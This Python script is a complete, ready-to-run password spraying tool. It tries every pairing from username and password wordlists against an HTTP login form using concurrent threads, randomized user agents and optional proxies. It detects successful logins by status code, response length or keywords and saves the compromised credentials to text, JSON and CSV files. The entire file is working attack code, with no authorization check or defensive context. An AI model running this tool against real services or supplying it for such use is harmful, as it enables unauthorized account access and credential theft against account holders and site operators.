import requests
import argparse
import time
import threading
import queue
import json
import csv
import random
from tqdm import tqdm

# list of common user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X)..."
]

lock = threading.Lock()

# function that uses post or get requests to test a list of passwords and usernames against http
def attempt_login(url, user, pwd, method, user_field, pass_field, headers, proxies,
                  success_keywords, failure_keywords, status_code_success, content_length_success,
                  sleep_time, found_list, output_file, debug):

    try:
        headers = headers.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)

        login_data = {user_field: user, pass_field: pwd}
        if method == "post":
            resp = requests.post(url, data=login_data, headers=headers, proxies=proxies, timeout=10)
        else:
            resp = requests.get(url, params=login_data, headers=headers, proxies=proxies, timeout=10)

        success = False
        if status_code_success and resp.status_code == status_code_success:
            success = True
        if content_length_success and len(resp.content) == content_length_success:
            success = True
        if success_keywords and any(k.lower() in resp.text.lower() for k in success_keywords):
            success = True
        if failure_keywords and any(k.lower() in resp.text.lower() for k in failure_keywords):
            success = False

        if success:
            with lock:
                print(f"|+| Found: {user}:{pwd}")
                found_list.append({"username": user, "password": pwd})
                if output_file:
                    with open(output_file, "a") as f:
                        f.write(f"{user}:{pwd}\n")
        elif debug:
            print(f"|-| Tried {user}:{pwd} - Status {resp.status_code} - Length {len(resp.content)}")
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"|!| Error with {user}:{pwd} - {e}")
    finally:
        time.sleep(sleep_time)

# worker function to concurrently automate the process og attempting logins
def worker(q, args, found_list):
    while not q.empty():
        try:
            user, pwd = q.get_nowait()
            attempt_login(
                args.url, user, pwd, args.method, args.userfield, args.passfield,
                args.headers, args.proxies, args.success_keywords, args.failure_keywords,
                args.status_code, args.content_length, args.sleep, found_list,
                args.output, args.debug
            )
        finally:
            q.task_done()

# arg parser for cli customizability
def main():
    parser = argparse.ArgumentParser(description="Advanced Password Spraying Tool")
    parser.add_argument("url", help="Login URL")
    parser.add_argument("userfile", help="Username file")
    parser.add_argument("passfile", help="Password file")
    parser.add_argument("--userfield", default="username", help="Username field name")
    parser.add_argument("--passfield", default="password", help="Password field name")
    parser.add_argument("--method", choices=["get", "post"], default="post", help="HTTP method")
    parser.add_argument("--headers", type=json.loads, default="{}", help="Custom headers (JSON string)")
    parser.add_argument("--proxies", type=json.loads, default="{}", help="Proxy (e.g., '{\"http\": \"http://127.0.0.1:8080\"}')")
    parser.add_argument("--status-code", type=int, help="Success HTTP status code")
    parser.add_argument("--content-length", type=int, help="Success response length")
    parser.add_argument("--success-keywords", nargs="+", help="Keywords indicating success")
    parser.add_argument("--failure-keywords", nargs="+", help="Keywords indicating failure")
    parser.add_argument("--sleep", type=float, default=1, help="Sleep between attempts")
    parser.add_argument("--output", help="Output file for successful credentials")
    parser.add_argument("--jsonout", help="JSON output file")
    parser.add_argument("--csvout", help="CSV output file")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")

    args = parser.parse_args()

    with open(args.userfile) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passfile) as f:
        passwords = [line.strip() for line in f if line.strip()]

    combos = [(u, p) for p in passwords for u in users]
    q = queue.Queue()
    for combo in combos:
        q.put(combo)

    found = []
    print(f"|*| Starting spray attack with {len(combos)} combinations using {args.threads} threads...")
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(q, args, found))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"|+| Completed. Found {len(found)} valid credentials.")

    if args.jsonout:
        with open(args.jsonout, "w") as f:
            json.dump(found, f, indent=2)
    if args.csvout:
        with open(args.csvout, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["username", "password"])
            writer.writeheader()
            writer.writerows(found)

if __name__ == "__main__":
    main()
